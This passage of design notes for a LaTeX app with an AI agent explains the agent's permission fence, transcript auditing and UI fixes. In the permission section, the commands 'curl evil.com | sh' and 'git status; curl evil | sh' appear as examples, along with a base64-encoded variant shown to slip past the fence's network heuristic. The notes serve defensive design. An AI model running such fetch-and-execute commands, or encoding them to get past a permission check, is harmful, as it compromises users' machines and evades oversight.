Recorded in `docs/architecture.md` rather than here, because it is mechanics rather than interface. The short version is that subagents are refused under both of the names the tool has had, removed from the model's context as well as refused at the fence, and refused a third time by a test that depends on no name at all; and that the open question about whether the fence reached inside a subagent was answered by the SDK vendored in this checkout's own virtual environment, having been written down as needing a live account and a real turn.

### The permission control has three positions, and the middle one is honest about itself

The complaint that started this run was hundreds of successive approval cards, and auto mode was supposed to be the answer and was not. It refused to cover any shell command carrying a pipe, a chain, a redirect or a substitution, on the argument that no rule could honestly describe such a command, since `git status; curl evil | sh` starts with `git`. That argument is correct and it was answering the wrong question: it is about what can be *remembered*, and it was being used to decide what to *ask*. So a writer who had turned the fence down still got a card for every pipe, which is the shape of nearly everything a build or a data task runs, and that is where the hundreds came from.

The control has three positions now, and a writer chooses which one they are in rather than being handed one switch that does not fit either thing they wanted.

**Ask before acting** is the old default. A card for every command, every fetch and every write that leaves the writing. It is the only one of the three that is a complete fence, and it stays the default.

**Run the work without asking** runs commands and edits silently, compound ones included. Two things still ask: a write that leaves the writing, which is a write outside the project or to a file the build executes, and anything that reaches the internet.

**Never ask about anything** means it.

**The naming of the middle position is the decision worth defending.** It would read better as "everything inside the project", and that would be a claim the code cannot keep. What the fence inspects is the tool call, not what the command then does, so a script the agent starts can write anywhere the writer can write and reach anything they can reach. The honest version is a name that says what happens, "run the work without asking", and a note under it that says which two things still ask. `_holds_back` in `nexttex/agent.py` carries the same statement for the next person to read the code, and the README says it in the writer's terms: this is a *quieter* fence, the complete one is the first position, and that is why the first position is still the default.

There is one heuristic in there and it is labelled as one. The promise that piped commands run silently collides with the promise that reaching the internet asks, because `curl evil.com | sh` is both. So the shell branch splits a command on the operators a shell treats as a boundary and asks when any segment's first word is one of about twenty that leave the machine, `git` included when it is followed by `push`, `pull`, `fetch`, `clone` or `remote`, since `git status` is most of what a build does. `echo Y3VybAo= | base64 -d | sh` walks straight through that and no list of words can close it. The comment above the list says so in as many words, because a heuristic that is read as a fence is worse than no heuristic.

**The fence stopped being two functions that could disagree.** `_auto_covers` decided whether to ask and `_why_asked` decided what the card then said, and they could differ: a write to a `latexmkrc` was once announced as a write outside the project, which was false twice over. There is one predicate now, `_holds_back`, and both the decision and the copy come out of it, which is the property section 8 was reaching for when it recorded that bug. `_rule_for` is untouched and simply stops being consulted by the fence: it is the scope of an "always" answer and nothing else, which is what `_memo_for`'s own docstring already argued for.

### Why the third position takes a sentence and a second press

A control that turns the fence off has to say so before it does, and this app has no modals. The idiom already existed: section 19 records that the new-conversation question "answers in place above the composer", so this does too, with the same anchor-aware dismissal and the same rule that focus goes into the block and onto the safe half of it.

Three sentences rather than one. The risk has three parts, and compressing it into a single line is how a warning becomes something people learn to dismiss. It says what stops being checked; it says where the danger actually comes from, which is not the writer's own judgement but the fact that the agent's instructions come partly from project files that arrive from templates, clones and co-authors; and it says that everything is still recorded, because that is the recourse that remains. It is said once, on the way in, and never repeated afterwards.

The header chip gains a word. Section 19 settled that the thing under the composer is the *control* and the chip in the header is the *state*, on the argument that a lowered fence which survives a restart has to be visible without opening anything. With three positions the chip has to say *which*, so it reads `Auto` or `Auto, all`, stays `--warn`, and one click steps back one position: the way out is never further than the place that tells you the fence is down.

The control itself stopped being a switch. `role="switch"` with `aria-checked` cannot describe three states, and a control that cycles through them makes the writer press it twice to find out where they are, so it is a three-row popover opening upward, which is the model picker's shape two icons along. Like every toggle popover in this app it passes its trigger to `useDismiss`, without which it closes on `pointerdown` and reopens on `click`.

### An answer that lasts as long as the conversation

The two things the middle position still asks about are things a turn asks about repeatedly. A run that adds eleven references put up eleven identical cards, and neither existing answer fitted: `Allow` was too little, and `Allow always` was a permanent grant the writer did not want to make for one afternoon's reading.

So there is a fourth answer, and the whole of "for this conversation" is that it is a set on the object. No file, no expiry timer, no cleanup path: `reset()` empties it, and the process ending empties it. It is keyed exactly the way a remembered answer is, so a compound command is covered by its own exact text and nothing else, and a remembered answer outranks it in the record, because that is the one the writer will go looking for in their settings later.

### The stand-in had to learn all three positions, and a gap

`ScriptedAgent` modelled the boolean, so a browser spec could see two of the three cases and not the third. It carries the mode now and it takes `holds` in the fence's own vocabulary, `outside`, `control` or `network`, so a script says what would stop a call rather than saying whether the switch covers it.

The part worth recording is smaller and cost a real half hour. The stand-in emitted `tool_use` and `tool_done` back to back, which no real call does, so every scripted call started and finished before anything could draw and the activity line went straight back to `Thinking`. A spec asserting that the panel names the file being read could not see the case a writer sees. The gap is the feature: the stand-in now waits its scripted duration between the two events. `docs/testing.md` says a stand-in kinder than the real thing tests nothing, and a stand-in *faster* than the real thing is the same failure wearing a different hat.

### The card stops taking the conversation away, which section 5 asked for

Section 5 specifies that the permission card blocks and that the composer disables and reads `Waiting on your approval`. The build did that, and it is wrong, so this is a recorded deviation rather than a drift.

The argument for the block was written for a world with a handful of cards in a session. What it does in practice is take the conversation away at the exact moment the writer has something to say, because the question they want to ask is very often *about* the thing the card is asking about: why does that need a shell, do it a different way, no, use the other file. A box that will not accept typing turns that into a thought they have to hold until the machine is ready for it.

What makes the change safe is machinery that was already there and unused by this surface. A question asked while a turn is running goes onto a queue and out when the turn ends, which is the `yours will go next` line. A card open means a turn is running, so a question typed during one queues itself with no new code at all. And the card's keyboard answers are bound to the card element rather than to the window, which section 5 records as being for CodeMirror's sake: the consequence is that typing `a` or `d` into a live composer is a letter in a sentence and cannot answer a gate.

Two things deliberately do not change. `awaitingPermission` still drives the `--warn` dot in the header and the state dot on the floating pill, because *the agent is waiting for you* has to be visible when the panel is closed, which is precisely when it needs saying. And the 350 ms input shield stays: it protects against a click already travelling toward the composer, which is a different concern from whether the writer may type.

The composer's own line says what changed, once, rather than leaving it to be discovered: `Waiting on your approval, or ask something else`. It used to print nothing there, because the box beside it was dead.

### Records collapse, questions never do

At a quiet position the transcript writes a row for every action, and at the quietest one that record is the only account of what was done, so a turn with forty tool calls produces forty `Allowed automatically` lines. That is the audit trail working and unreadable at the same time.

Consecutive records with the same tool, the same decision and the same literal text collapse into one row with a count, which is the shape `tidy` already used for repeated tool rows. The rule that matters is the other half: an *undecided* card never collapses with anything, however much it has in common with the one above it, because a card is a question and two questions are two answers the writer owes. One row with a count would be one press for both.

The resolved row also gained two states, taking it to five. `Allowed for this conversation` and `Allowed from now on` are not the same thing as each other or as `Allowed`, and the record has to be able to say which, because the last of them is the one a writer goes looking for in their settings a week later. The dots stay as they were: `--ok` for what a person allowed, `--ink-3` for what they refused, `--warn` for what nobody was asked about.

The fourth button carries the keyboard hint `C`, alongside `A`, `⇧A` and `D`, and appears under the same condition `Allow always` does, which is that there is something nameable to scope the answer to. Four buttons at the panel's 320 px minimum is why section 5's `flex-wrap` note exists, and the row was already built to give way rather than pushing `Deny` off the card.

### The editor goes to the line while the agent is writing it, not after

`handlers.onAgentEdit` already opened the file and scrolled to the changed line once an edit had landed, which is a report rather than a collaboration: the writer reads about it afterwards. The other half is knowable only at one moment, and it is not the one anybody would reach for first.

The fence knows. On the branch that approves a write inside the project it has just read the file to take the undo snapshot, so the tool arguments say what the model is matching on and the snapshot says what it will match against. A second later the file has changed and the question has no answer. So `landing_line` runs there, against that text, and a `focus` event carries the path and the line before the write happens.

It returns nothing rather than a guess wherever the answer is not certain: an `old_string` that is absent, or that occurs more than once, which `replace_all` makes an ordinary case rather than a strange one. A flash on the wrong paragraph is worse than no flash, because it sends the reader to look at something that did not change and spends the trust that the highlight means anything.

The browser side is `jump` with two things taken out rather than a second function. `steal` decides whether the dispatch carries a selection and whether the view is focused, and everything else, the clamping, the word lookup, the scroll and the two teardown timers, is shared. The highlight holds three seconds for a `focus` rather than the 700 ms a jump uses, because the write it points at has not happened yet and a flash that has faded before the text changes has pointed at nothing.

**The caret rule was too narrow and this is where that showed.** `onAgentEdit` spared the composer: it checked whether the active element was a textarea and handed focus back afterwards. So a writer typing in the *editor* had their cursor thrown across their own document by the agent's edit, which is the same bug as the one being fixed, in the surface being fixed. Neither path takes focus now, and both consult one question instead: has this person typed into the document in the last three seconds. Three seconds is a pause in typing rather than a pause in thinking, and it is deliberately not a focus check, because the caret sits in the editor for the whole time somebody is reading their own paragraph.

`busyTyping` lives in `timing.ts` rather than in the store, because it is read imperatively by whoever is about to move the view and must not cause a render: it changes on every keystroke. It counts only local changes, using the annotation the collaboration binding already sets, so a co-author typing does not pin this person's view in place.

`firstChangedLine` exists twice, once in Python and once in the browser, and the Python side briefly had it three times before that got fixed properly. The fence needs it, the stand-in needs it, the OpenAI agent needs it, and none of them may import `agent.py` to get it, because that pulls in the Claude SDK: so it lives in `nexttex/lines.py` alongside the `\end{document}` scan, which was also written twice and for the same reason. The browser's copy cannot be shared and stays, and `tests/test_agent_parity.py` asserts the same six cases against the Python one with a comment in each file naming the other.

### The preview follows too, and the anti-jump rule decides how

The machinery for this existed end to end and nothing was triggering it. `source_to_pdf` in `nexttex/synctex.py` answers where a source line ended up, `server/main.py` serves it, and `Pdf.tsx` has a `reveal` handle that already handled both view modes with the arithmetic each needs: in page mode it sets the current page and renders it, and in scroll mode it scrolls to the box's offset within its page container, less a third of the pane's height so the target lands in the upper third rather than against the edge. The only thing that called it was `Cmd/Ctrl-Enter`, which is a person saying take me there.

An agent edit gets it now, and it waits for the build. Forward search reads the `.synctex.gz` that the last build wrote, so asking the moment the edit lands answers for the document as it was before the edit. The place is held until `onCompileDone`, which is when there is something true to move to.

**Two things decide how far this goes, and they pull in opposite directions.** Section 4 records that the diagnostics drawer deliberately never opens itself, because the build fires 1.6 seconds after every pause in typing, which is very often mid-thought. Section 6's anti-jump rule says the same thing about the preview. Against that: an agent edit puts content somewhere the writer was not looking, which is exactly the case forward search exists for.

This first shipped as *agent edits only*, on the reading that the writer's own typing was the diagnostics drawer's case in the other pane. The writer asked for their own typing too, and they were right, which is worth recording as a correction rather than as a preference: the argument against it was about a page that jumps *while nothing has changed on it*, and the argument had quietly borrowed the drawer's situation, where a list of errors covers the document you are reading. The preview covers nothing. Following the caret after a build is the same act as the double-click that already goes the other way, and a writer editing chapter five while the page shows page two is looking at a stale answer rather than a useful one.

So both move it, and one rule does the work of keeping it quiet. **The move is gentle**, which is a flag on `reveal` rather than a second function: it moves the view only when the target is not already in front of the reader, and both modes need that question answered differently, page mode asking whether the page on screen is this one and scroll mode asking whether the box is inside the part of the document the reader can see. Either way the box flashes, because something did change there. That is what makes following the caret unobtrusive in the common case, which is a writer working down a page they are already looking at: nothing moves.

**Whether a build was caused by this person typing is decided when it starts, not when it lands**, and that is the one thing here that is not obvious. At the end the question has no stable answer: the build fires 1.6 seconds after a pause and takes a third of a second on a chapter, so a keystroke is recent when that lands, while a full thesis takes seventeen seconds, by which time the same test says nobody has typed. Deciding at the end would have meant the preview following a chapter build and not a thesis one, for no reason a writer could infer. At the start the answer is stable whatever the build costs.

So a rebuild the writer asked for explicitly while reading moves nothing, a collaborator's edit moves nothing, and neither does an agent edit landing while the writer is mid-sentence. There is a browser spec for the negative case as well as the positive one, because the negative one is the anti-jump rule and it is the half that would rot silently.

### Select a paragraph and say what to do with it

The selection already reached the store undebounced, already travelled with the question, and the composer already showed a chip saying which lines went with it. Two things were missing, and one of them is not an interface problem at all.

The interface half is a row of verbs over a non-empty selection: **Reword**, **Shorten**, **Expand**, **Ask**. Placed from the document rather than from the pointer, so a selection made with the keyboard gets one too, and above the first selected line rather than below it, because below is where the rest of the paragraph is.

It seeds the composer and does not send. Section 5 settled that rule for the `Fix` button on a diagnostic, and gave the reason: the user always presses Enter on their own message. The argument is stronger here rather than weaker, because rewording forty lines of a chapter is a larger act than fixing one error, and because the second half of the instruction is usually the part that matters. Reword this, *and keep the citation*. The seeded text is a sentence rather than a command word for exactly that reason: it is a first draft of the question, and the writer finishes it.

Four verbs, and the two that are absent are the decision. There is no **Improve**, which says nothing about what will change and produces the diff nobody can review. There is no **Cite**, because section 17's rule is that a citation is never composed, and a verb that looks like it produces one is a promise this app does not make.

A selection has to be worth acting on before the row appears. A double-click on a single word happens constantly while reading, and a control appearing over it every time would be the diagnostics drawer's mistake in a third pane, so the row wants a dozen characters before it draws. It is fetched on that first selection rather than before anything draws, like every other surface in this app that sits behind a gesture.

### The other half was a tool, not a control

"Reword this paragraph" used to reach the model as text and come back as an `Edit` carrying an `old_string` the model had reconstructed from what it was shown. That is fragile in general and specifically fragile here: this project's own writing rule is that one paragraph is one line however long, so the string being reproduced exactly is often several hundred characters, and a stray `%` or an unusual macro breaks it. Worse than breaking, it can match the wrong occurrence in a chapter that repeats a phrase.

`replace_range` takes the path, a first and last line, the replacement, and the text the model was shown. The last of those is the check that matters and it is the one thing this tool has that `Edit` does not need: a turn can spend half a minute thinking while the writer keeps typing, and an edit that silently overwrote what they typed in that window would be the one real harm this feature could do. It is refused instead, with a sentence saying why.

It goes through the same `apply_edit` path as every other in-process tool, so the edit is confined to the project, versioned, folded into the shared document, shown as a chip with its diff, and undoable. It refuses a control file for the same reason `insert_figure` refuses a path outside the project: these tools are waved past the fence precisely because each one promises to stay inside the writing, so the promise is where the test goes.

The OpenAI agent got the same tool, because its `edit_file` is a find-and-replace with the same weakness, and adding a second write tool there finally split the edit event and the fallback write out of `_write` into one `_save` that both use.

### A figure from a dataset, and why the first attempt has to look right

The tool takes a script rather than a chart description, and everything else follows from that. A description-shaped tool can draw a bar chart and cannot draw the figure a paper needs; a script can do anything, and it is also the thing a reader can check, re-run and change next year when a referee asks for the same plot on a log axis. So the script is written into the project's own `scripts/` directory through the same path a chapter takes, which means it gets a version, a chip and a place in the writer's history: it is source they will read, not a temporary file.

**This is the one tool of ours that the fence has to ask about, and it breaks a sentence that was previously true.** The comment above `_ALWAYS_OK` says NextTex's own tools are allowed by construction because none of them can reach the shell or a path outside the project, so a card for one would be a card for nothing, and a card for nothing teaches the writer to click Allow without reading. A tool that runs Python the model wrote can start a subprocess, open a socket and write anywhere the server's user can write: it has strictly more reach than `Bash`. Routing it around the fence would put the app's one real fence behind the one tool whose purpose is to run arbitrary code. So it is fenced like a shell call, asked about at the first position with the script itself as the card's literal text, and silent at the other two. One card per plot is not the hundreds this rework exists to remove, and the comment above `_ALWAYS_OK` now names its own exception rather than leaving the next reader to find the hole.

The run itself is `sys.executable` and nothing else, with no shell on the path, which is deliberate and worth a sentence: it is the virtual environment `requirements.txt` installed matplotlib into, so there is no `PATH` search and no guessing between a system 3.9 and the venv, and the answer does not depend on the writer's shell. `MPLBACKEND=Agg` and no `DISPLAY` is the whole answer to a script trying to open a window: with it set, `show()` is a no-op rather than a wait on an event loop that will never arrive. Output is clipped at 64 kB per stream for the reason section 27 exists. And the run is verified rather than trusted: the output must exist and be newer than the run's start, because a script that exits zero having written nothing is the common failure and reporting it as a success sends the model on to insert a figure that is not there.

### What "publication quality" actually means, and the thing that decides it

The baseline is two files, `scripts/plotstyle.mplstyle` and `scripts/figure.py`, copied into the project the first time it plots and never overwritten afterwards. In the project rather than inside NextTex, because a baseline the writer cannot open is a baseline they cannot argue with, and because their edit to it has to survive the next plot.

Most of what is in them is ordinary good practice: a serif face so the labels match the document rather than the software, two hairline spines instead of a box, ticks pointing in with minors on, no grid, a colour-blind-safe cycle that also separates in greyscale because a referee may print it, a frameless legend, no title because a paper's figure is captioned, and `pdf.fonttype: 42` so the text is not a Type 3 subset that several publishers refuse.

**One decision matters more than all of those together, and it is not a style setting.** A figure must be *drawn* at the width it will be *printed* at and included with no scaling. Then a 10 pt label in the script is a 10 pt label on the page, the same size as the caption under it. Matplotlib's default figure is 6.4 inches wide, and including that at `0.8\linewidth` shrinks every label to about 5 pt, which is the single reason default figures are unreadable. Drawing a 3.4 inch column figure and including it at a one-column article's full text width makes the same mistake in the other direction, and the axis label comes out larger than the body text.

That is why `figure()` takes a width by name and defaults to the text width, and why `\linewidth` rather than `insert_figure`'s usual `0.8\linewidth` is what the model is told to insert these at. It is also why `savefig.bbox: tight` is deliberately *not* set, against matplotlib's usual advice: tight bbox crops the output to the ink, so the saved figure is no longer the width it was drawn at, and the guarantee quietly stops holding. `constrained_layout` already fits the labels inside the figure, which is what tight bbox is normally compensating for, so with it on the saved width is exactly the width asked for.

**All four of those were found by looking, not by reasoning.** The first render came out with the axis label larger than the caption, which the arithmetic above predicts and which no test would have caught. The second came out too small, and the cause turned out to be the ad-hoc test document rather than the figure: an `article` with no `geometry` has a 4.8 inch text block, and NextTex's own template loads `geometry` with one-inch margins and gives 6.52. Measuring `\showthe\textwidth` against the figure's media box settled it: 469.8 pt against 468, and the label measured at exactly 10 pt on the built page. The style sheet's own claim is now a measurement rather than an intention.

Pointing at the dataset is a file-tree item, `Plot this`, offered on the extensions data actually arrives in and on nothing else, because an item that explains itself by failing is worse than no item. It seeds the composer rather than sending, like the selection verbs one pane over and for the same reason.

### The agent screen had no way off it, and the control to reach it was hidden

Reported by the writer during this run, and it is two bugs that look like one.

The screen that chooses a provider did have a Back button, and it was withheld unless `projectId` or a non-empty project list was truthy. That test was standing in for the real question, which is whether the screen was *opened* or *shown*: it is shown at boot when no agent has been chosen, where there is genuinely nowhere to go, and opened from the settings sheet or the project list at any other time. An install that chose no agent at setup, opened its empty project list, and clicked to set one up satisfied neither half of that condition, so it got no way back and the only exit was choosing a provider. The two cases are told apart exactly now, by a flag the opener sets.

Escape does the same thing, one level at a time: out of the provider you were part-way through setting up, then off the screen. That is what Escape means everywhere else here, and section 19 records the rail's own version of the same rule.

The outer control also said `Back`, and so did the button inside each provider's panel, which goes up one level rather than out. Two controls with the same word meaning two different things is its own bug, so the outer one is `Close` and says on the screen that closing leaves things as they are, since somebody may be here only to look.

The second half is that the way *in* was a text link under the strapline, shown only when the provider was `none`. So somebody using one provider who wanted the other had to know it was inside the settings sheet. It is a control in the projects header now, in the cog's own chrome so the three read as a set, present whatever the provider is, and it names the agent rather than only saying there is one, because that is the question somebody opening it has.

The glyph is a nib, and deliberately not the current provider's mark. The floating agent button wears that mark and opens the panel of the agent you have; this control changes which agent you have, and one wearing Claude's mark that takes you to a screen offering ChatGPT and nothing is wearing the wrong thing.

### An image handed over rather than described

A writer looking at a referee's marked-up page, a screenshot of a table that has come out wrong, or a figure from somebody else's paper wants to hand it over. Describing a visual problem in prose is the tax this removes, and it is a large one.

Three ways in, in the order people will use them. Pasting, because a screenshot arrives on the clipboard as a file on all three platforms, so that is the whole of it: no dialog and no permission. Dropping on the panel. And a control under the composer, because neither of those is how everybody works and because a control is also the only thing that says the feature exists at all.

A paste that is text and a drop that is a `.bib` file fall through to the browser's own handling rather than being refused with a message about a thing the writer was not trying to do. What the agent cannot look at is refused by the route, which is where the short list of what it can look at lives, and an image too large for the model is refused with the number rather than attempted: the upload path allows 256 MB, which is right for a dataset and wrong here, because the model has its own limit and a 20 MB screenshot is a failed turn rather than a slow one.

**The chips have a thumbnail, and that is the part worth arguing for.** A filename is not enough: an image attached by accident to a question about something else is worse than no attachment, and seeing it is the only way to notice. They sit above the composer beside the selection chip, which is the same idea in the same place, and they go when the question goes.

The question itself reads as what was typed. The paths are named to the model in the same preamble the selection uses, and `turn_start` does not carry that preamble, so the conversation on screen is not a sentence with a list of file paths stapled to it. The chips are what say an image went with it, which is what a person looking at the transcript afterwards actually wants to know.

Where the bytes live is decided by section 27 rather than by preference, and it is recorded in `docs/architecture.md` with the rest of the mechanics.

### Three small things, and one deliberately left out

**Escape stops a turn.** Stop is the writer's one escape hatch from a turn that is doing the wrong thing, and it was a `t-micro` text button in a 32 px header that can be folded away entirely. Escape is where a hand already goes when something should stop, and Escape in the agent panel already meant something: it closed the panel. So it stops first and closes second, and not both, because pressing it once should not also hide the transcript of what the turn had got to before it was stopped, which is the thing the writer is about to read. The key is named on the button's own tooltip rather than only in the README's table, because a shortcut nobody knows about is not one.

**The turn has its own age, beside the age of what it is doing.** Those are very different numbers on a long turn: a writer wants to know a turn is two minutes old, not that its current tool call is four seconds old. Parenthesised, so the pair reads as one thing rather than as two counters competing, and on the interval that was already running.

**A figure whose filename has a space in it is flagged rather than refused.** `\includegraphics{a b.pdf}` sends TeX looking for `a` and then complaining that `b.pdf` has an unknown extension, which names neither the file nor the problem: it is a puzzle rather than a message, and it arrives a build later than the mistake. The write is not refused, because the file does exist and refusing would be worse than saying so, and the model is told so it can rename it.

**The Sections panel did not get the selection verbs, and that is a decision.** The plan for this run said the verbs belonged on a section in the rail as well as on a selection in the editor, on the grounds that the outline already knows the range. It is convenience rather than capability: selecting the section in the editor already produces the verbs, so a second entry point buys a shorter route to something already reachable, and it costs a hover control on every row of a panel that can hold forty of them. Left out, and written down rather than quietly dropped.

### The em dashes the app was shipping in its own voice

`nexttex/writing.py` opens with two rules stated as absolutes, and the first is that there is never an em dash, in the document or in what the agent says to the user. The app was breaking it in its own voice in about three hundred and eighty places: forty-eight in the interface, twenty-five in the Python, and the rest in these documents, this one worst of all.

That was not an oversight so much as a reading. The rule looked like it governed prose written *into* somebody's project, and the evidence for the narrow reading was that the repository's own markdown was full of them. The evidence was the thing to fix.

The interface strings and the Python went by hand, because each one wants a different repair: a comma where the dash was parenthetical, a colon where what followed was an explanation, a full stop where it was joining two sentences that wanted to be two. Three hundred and forty-eight in the documents went through a rule and then a read: a parenthetical pair became a pair of commas, an elaboration with its own internal punctuation became a colon, everything else became a comma, and the two patterns that came out wrong, a label in a table cell and a label at the head of a list item, were put back as colons because a comma there reads as a list of two things where the original read as a definition.

Two characters stayed and both are the same exception. `–` is now the "no value yet" glyph in the page counter and the file name in the status strip, where a word would reflow a strip that must not reflow; it is a different character and the rule bans the em dash itself. And the em dash inside `tests/test_explain.py` is a TeX error message *about* a stray em dash, where the character is the subject rather than the punctuation.

The test that held the README to this now holds the whole repository, which it could not before, and three files are exempt for the reason above. That is the part worth keeping: the backlog is gone, and the thing that let it accumulate was that nothing looked.

### The palette section disagreed with the stylesheet, and nothing could notice

This document's own preamble says that when it and the implementation disagree, that is a bug in one of them and the thing to do is decide which. Its palette section disagreed with `frontend/src/styles.css` for weeks: a commit updated the table and missed the prose two paragraphs below, so the document said the pen was `#74408E` when the stylesheet said `#6F2998`, and said the dark surround was `#141715` when that is the light theme's ink.

The prose is corrected, and there is a test now, because nothing could have noticed. Not a check that every colour named here is in the stylesheet, since this section legitimately names colours that are somebody else's: NexusQC's accent, and the indigo this app is explicitly not. The narrower rule is the one that actually broke, which is that a colour presented as *ours* has to be one the stylesheet sets.

### What round two found, which was five things and none of them in a test

The suite was green, the browser tier was green, and then the interface was photographed at both themes and read against the sections above. Five things, written down before any of them were fixed, because a list fixed as it is found is a list that stops at the first hard item.

**The welcome message described a fence that no longer exists.** It promised, in the agent's own voice, that a shell command or a file outside the project would be asked about first. That is true at the first position and false at the other two, and it is the first thing a new reader sees. It names the control now rather than the behaviour, which is both accurate and more useful, since somebody reading it for the first time may not know the control is there.

**The turn's plan came back as protocol noise.** The panel draws it live and does not record it, but the *transcript* recorded the `TodoWrite` call like any other tool, so a reload replayed a row called `TodoWrite`, twice, collapsed with a count. The live path and the replayed path disagreed about what kind of thing this was. Nothing in a test could have caught that, because both halves were behaving exactly as written.

**A comma before a monospaced run has less air than the dash it replaced.** The resolved-permission row read `Denied` and then a URL with almost nothing between them: the em dash sweep had turned a wide separator into a narrow one in a row that is mostly separator. It is a space now, which is the status strip's own rule for its segments, and the right answer all along.

**The composer said the same thing twice while a card waited**, once in the placeholder and once in the line beneath, and the line was long enough to truncate at the panel's own width. The placeholder carries the invitation and the line carries the state, and neither repeats the other.

**The plan scrolled out of view.** Revised in place, it stayed where it first appeared, so a turn with any output at all pushed it off the top and the panel was carrying a list of what it intended to do somewhere the reader could not see, which is the opposite of the point. A revised plan is new information and now goes where all the other new information goes, keeping its id so the row is reused rather than replaced.

### One thing looking found and left alone

The verb row over a selection takes the editor's palette rather than the furniture's, so in the light theme it is a light card on a lit page. Section 23 says every floating card takes the dark palette while the theme is light, and by the letter of that this is a deviation.

It is deliberate, and the precedent is already in the build: the spelling menu is the only other thing that floats *inside* the editor pane, and it is light there too. The rule in section 23 is about the furniture, and the argument under it is that the page must stay the brightest object on screen. A dark card dropped on a lit page does not serve that argument, it reads as a hole punched in the page, which is the same complaint section 23 makes about the dark theme's PDF needing a shadow. So the rule holds for everything floating over the chrome, and the two things that float over the page follow the page.

### The worst thing in the run, found by reading the record rather than testing it

The plan for this work said, under verification, that somebody should read `.nexttex/transcript.jsonl` by hand after a session at the quietest position, because that file is the audit trail, it is what the whole case for a position with no cards rests on, and nothing asserted that it read as a coherent account of anything.

It did not. Every action the agent had taken without being asked came back, after a reload, reading `Denied`.

The mechanism is small and the consequence is not. A decision normally arrives *after* the card, through `note_decision`, when the browser answers one. Nobody answers an automatic approval, or one covered by a rule they set earlier, so nothing ever wrote a decision down for those: the event carried one and the transcript's permission branch did not keep it. On replay the panel then found a card with no decision, and it marks those refused, on reasoning that is correct in the case it was written for, which is a card still open when the window closed and which can never be answered now.

So the record of a fully automatic session said the writer had refused things that had actually happened to their document. Section 5 states the rule this broke in as many words: an action nobody was asked about is not the same as one the writer allowed, and the record must not read as though it were. This was worse than that, because it read as the opposite of both.

Two things are worth keeping from it. The first is that the manual read was in the plan because no test could be written for "does this read as an account", and the thing it found was not subtle prose but a straightforward inversion of fact that four hundred green tests walked past, because both halves of it were behaving exactly as written. The second is that the check is a test now, and it prints the account as well as asserting it, so the next person changing the transcript can see what a reader would see rather than only whether the keys are present.

## 29. A value set once and never set back

Reported by the writer: the project list finds an update, you press Not now, and from then on Check for updates does nothing at all. Their second sentence is the one that made this a section rather than a fix. "Seems there may be more things like that broken on the projects screen."

There were seven, and they are all the same bug wearing different clothes. Something is written down once, at the moment it is first true, and there is no path back. A dismissal that outlives the question it answered. An answer read on mount that nothing revises. An error with no one to clear it. A flag raised at the start of a job that only one of the job's four endings lowers. None of these is a mistake in the ordinary sense: every one is a correct line of code that was right about the case its author had in mind and silent about the others.

`c527b6e` was the same family, a fortnight earlier, and that is the interesting part. The screen that chose an agent withheld its way out on a condition that was true in the case its author was thinking of and false in the one that mattered.

### What the update footer had got wrong

The dismissal was tested in the render rather than in the check. `check(asked)` carries a flag saying whether a human asked, which four lines in decides whether a failed check reports itself or stays quiet, and then throws the flag away. So by the time the answer reached the screen, a result the writer had pressed a button for and a result nobody asked for were indistinguishable, and the dismissal silenced both. The request went out, the server answered past its own cache, and the answer was discarded on the way to the page. The key is `head:behind`, which moves only when upstream gains a commit, so on a quiet upstream the update was unreachable from the interface for good.

The fix is to read the dismissal the same way the failure path already reads it. But the more useful half is what the dismissed state now says. It used to leave a bare `Check for updates`, which is exactly what an install that has never checked shows: the screen knew an update was waiting and had no way to say so. An update put off until a quieter afternoon has to leave something to come back to, so it reads *"An update is waiting."* with `Show it` beside it, in the grey line the docs-only case already uses. `Not now` keeps the report rather than discarding it, which is what lets that line exist at all.

### A callback prop is a promise the second caller does not make

The access card told the thing that opened it when a password had been saved, through a prop. There are two places that open it, the nudge at the foot of the project list and the settings row behind the cog, and only the first passed the callback. So setting a password from the cog left the warn-barred line three inches below still reading "This install has no password", for the rest of the visit, because the nudge had read the answer once on mount and the only thing that revised it was a message it was no longer being sent.

The comment beside that prop says, in as many words, that it exists to stop the screen contradicting itself. It did stop it, at one of the two places it could.

It is an event now, the same shape as `APPEARANCE_CHANGED`, and for the same reason that one is an event: the thing which needs to know is not the thing that opened this. A prop reaches whoever passes it and a third mount point later cannot forget to.

### An error is not a state, it is a message, and messages end

Three of the seven were errors that outlived their cause, and the worst was not the lingering itself. The access card draws `error ? … : said ? … : null`, and only one of its three actions cleared `error`. So one failed name save meant every later action in that card succeeded in silence behind a red line saying something had failed, with a screen reader announcing the stale error and nothing else. A message that persists does not merely linger; it takes the channel with it.

The project list has the same shape without the masking: one string, five writers, two clearers, so a PDF that would not typeset left its complaint under whichever tab the writer moved to next. `store.ts` has a notice list built for exactly this, and `notices.test.ts` opens by describing the regression in its own words, but the region that draws notices is mounted after the early return that shows the project list, so from that screen it does not exist. Moving it there would be worse: a floating toast over a list of projects is further from where somebody who just pressed something is looking than a line under the form. So this one stays a line, and the line is cleared when the thing that caused it succeeds.

### A busy flag needs as many ways down as the job has endings

The Claude install panel hides both of its other branches while installing, so the whole screen is one log with no Back and no Cancel. That is fine as long as the flag always comes back down, and it was lowered by one thing, a `done` frame, where the job had three other endings: the server answering that the CLI was already there and starting nothing, the stream dropping, and the stream ending without that frame. All three left a screen with no way off it but Escape, which nothing on it mentions.

The rule this suggests is worth stating generally, because the same shape is in the update footer's restart poll: **count the ways a thing can end, not the way it is meant to end.** The login flow directly beneath this one has had a Cancel from the beginning, which is the same observation made by whoever wrote it.

### Two that were reached through an error path

The restart poll learns which process it is watching before waiting for a different one to answer. That ask fails exactly when the server is mid-restart, which is the reason a tab is joining a running update in the first place, and the fallback was an empty baseline that the first answer filled in. The first answer is from the new process, so the comparison could never fire and the reader was told a minute later to restart a server that had come back long ago, which is precisely the failure that code was written to prevent, reached through its own error case.

And a button on the failed-update card read "Hide the log" and was wired to a function with no body. Not a latch, but the same lesson from the other side: it was written for the branch where the log is always shown, and the control it shares with the other branch went on drawing itself.

### What the sweep is worth, and what it is not

Seven found, three deliberately left, each with the reason in `TRACKER.md`. The three left are all cases where the symptom is real and the fix asks a larger question than the symptom is worth: what `state.error` means now that a notice list sits beside it, whether a sign-in error should survive a move between panels, and whether a warning somebody has put away for good should have a way back that is not the settings sheet.

What is worth noticing about the whole list is that not one of them could have been found by a test. Every single one is a correct line of code doing exactly what it says, in a case its author did not have in front of them, and the tests that cover these paths were green throughout and are still green. They were found by asking one question of a screen, over and over: what sets this back.

## 30. Fixing what the September review found

The review that produced `REVIEW.md` recorded 126 findings and fixed none of
them, deliberately: a list fixed as it is found stops at the first hard item.
This section is what the fixing changed, one subsection per idea rather than
one per record, since the point of the review's mechanism grouping was that
